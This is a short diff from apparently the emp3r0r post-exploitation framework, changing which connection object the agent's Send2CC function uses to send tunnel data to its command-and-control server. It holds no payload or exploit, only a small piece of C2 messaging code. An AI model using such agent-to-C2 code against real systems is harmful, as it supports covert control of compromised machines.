@@ -59,7 +59,7 @@ func IsAgentAlive(c net.Conn) bool {
 
 // Send2CC send TunData to CC
 func Send2CC(data *emp3r0r_data.MsgTunData) error {
-	var out = json.NewEncoder(emp3r0r_data.H2Json)
+	var out = json.NewEncoder(emp3r0r_data.CCMsgConn)
 
 	err := out.Encode(data)
 	if err != nil {
